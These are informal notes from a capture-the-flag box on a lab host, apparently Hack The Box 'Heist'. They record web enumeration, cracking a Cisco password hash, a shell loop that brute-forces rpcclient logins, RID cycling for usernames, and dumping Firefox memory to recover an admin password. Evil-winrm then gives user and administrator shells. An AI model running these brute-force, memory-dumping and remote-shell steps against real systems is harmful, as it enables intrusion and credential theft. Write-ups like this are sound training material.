dirb

	looking for log files
		dirb http://10.10.10.149/attachments/ /usr/share/dirb/wordlists/big.txt -X ".txt,.log, " (becuase exposed log files are realistic)

		a quick google search of "service password-encryption" brings up a lot of CISCO stuff and references CISCO IOS, which is used in routers and switches
		further down in the config file is "router bgp 100", definitely a router config file

			a google search for "cisco router config file passwords" yields [this website](https://www.cisco.com/en/US/products/sw/iosswrel/ps1831/products_configuration_guide_chapter09186a0080347975.html) which reveals that "password 7" means it was encrypted with some cisco specific dofware

SMB is running
	tried using msf to bruteforce, no dice

winrm is running
	same

back to enum
	dirb shows an issue page but it is blank
	dirb also shows a login page that allows guest login, let's grab session cookie
		curl -I http://10.10.10.149/login.php?guest=true
			Set-Cookie: PHPSESSID=pp36invteXXXXXXaq9sqf18jh0v; path=/
	now let's read the issues page
		curl -b "PHPSESSID=pp36invteXXXXXXaq9sqf18jh0v" "http://10.10.10.149/issues.php" | less

		enumerated hazard and support admin (along with variants to be sure) as users
		current user list

tried bruteforcing rpc, no avail
	for i in $(cat users.txt); do for j in $(cat pass.txt); do echo $i%$j && rpcclient -U "$i%$j" 10.10.10.149 && sleep 1; done; done;

going back to enum

I missed a md5 in the config file
	$1$pdQG$o8nrSzsGXeaduXrjlvKc91

hashcat help confirms it is a md5 for cisco

threw rockyou at it w/ hashcat, no rules
	stealth1agent

updating password list
	$uperP@ssword
	Q4)sJu\Y8qz*A3?d
	stealth1agent

bruteforcing rpc again
	for i in $(cat users.txt); do for j in $(cat pass.txt); do echo $i%$j && rpcclient -U "$i%$j" 10.10.10.149 && sleep 1; done; done;
	hazard:stealth1agent is a valid cred pair
	
enuming shares to determine privilege
	crackmapexec -u users.txt -p pass.txt --shares 10.10.10.149
	
	definitely not privileged

tried multiple ways of getting a shell, not working, back to enumeration
	first method - https://github.com/byt3bl33d3r/CrackMapExec/wiki/Getting-Shells-101 (not admin)
	second method - https://www.redspin.com/it-security-blog/2011/03/get-a-meterpreter-shell-using-smb-credentials-2/) (not valid creds)
	third method - https://github.com/Hackplayers/evil-winrm/blob/master/README.md (not valid creds)

in looking up different enum methods and reading the ones listed in crackmapexecs help, i came across sids, trying to figure out how to enum them with rpcclient since msf and cme do not seem to do the job

	rpcclient -U 'hazard%stealth1agent' 10.10.10.149
	
	well would you look at that, press ? in the client and at the bottom it shows how to lookup sids
	mine (hazard's) is 1008, going up
	chase is at 1012
	jason is at 1013
	went up to 1020
	updating users.txt, just realized windows does not seem to be case sensitive with usernames
		rout3r
		admin
		hazard
		support admin
		support
		chase
		jason

verified chase has the password Q4)sJu\Y8qz*A3?d with rpcclient
	for i in $(cat users.txt); do for j in $(cat pass.txt); do echo $i%$j && rpcclient -U "$i%$j" 10.10.10.149 && sleep 1; done; done;	

GOT A SHELL
	evil-winrm -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'

user.txt is on chase's desktop
let's see what processes are running

I just recalled, this is running a webserver, can I write to it?
	no, i can't, back to the processes

Cannot seem to use Invoke-Binary in evil-winrm so I cannot execute a non-native command (external program)
But, I can upload a program and run ./program

Tried Windows privesc by pentest monkey, no dice

Can I see what the browsers are doing?
	https://docs.microsoft.com/en-us/sysinternals/downloads/procdump

dumped all firefox processes
	./procdump64.exe -ma [ID]

found the following string in memory
	localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=

adding the follwoing to the passwords
	4dD!5}x/re8]FBuZ

logged into the webserver as admin with those creds!

got admin shell!
	evil-winrm -i 10.10.10.149 -u administrator -p '4dD!5}x/re8]FBuZ'

submitted flag (on admin's desktop)
